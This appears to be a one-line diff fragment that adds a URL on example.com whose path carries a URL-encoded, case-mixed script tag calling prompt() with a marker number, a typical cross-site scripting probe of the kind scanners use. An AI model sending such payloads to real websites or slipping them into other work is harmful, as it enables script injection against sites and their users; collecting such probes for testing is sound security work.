@@ -1,0 +1,1 @@
+http://www.example.com/filename.php/1%3CScRiPt%3Eprompt(923395)%3C/ScRiPt%3E"
